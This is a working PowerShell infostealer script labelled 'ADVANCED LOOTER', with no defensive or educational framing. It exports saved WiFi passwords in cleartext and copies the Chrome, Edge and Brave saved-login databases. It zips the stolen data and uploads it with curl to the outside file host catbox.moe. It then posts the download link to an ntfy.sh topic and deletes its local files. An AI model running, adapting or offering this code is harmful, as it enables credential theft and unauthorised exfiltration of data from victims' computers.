$topic = "data_stwealer_hideen_"

Write-Host "=== [ ADVANCED LOOTER ] ===" -ForegroundColor Cyan

# 1. Setup
$dir = "$env:TEMP\LootBox"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
mkdir $dir | Out-Null
$zip = "$env:TEMP\package.zip"
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. Grab WiFi (Plain Text)
Write-Host "[*] Exporting WiFi..." -ForegroundColor White
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Grab Browser Data (Encrypted Databases)
Write-Host "[*] Collecting Browser Credentials..." -ForegroundColor White
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        $name = ($path -split '\\')[-3] # Gets 'Chrome' or 'Edge'
        # Copying with -Force to bypass some read locks
        Copy-Item $path -Destination "$dir\$name`_LoginData" -Force
        Write-Host "    [+] Grabbed $name database." -ForegroundColor Green
    }
}

# 4. Zip everything
Write-Host "[*] Packaging loot..." -ForegroundColor White
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 5. Upload to Catbox
if (Test-Path $zip) {
    Write-Host "[*] Uploading..." -ForegroundColor Yellow
    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
    
    if ($link -like "http*") {
        Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot (WiFi + PassDB): $link"
    }
}

Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Read-Host "Press Enter to Clean & Exit"
Remove-Item -Recurse -Force $dir, $zip
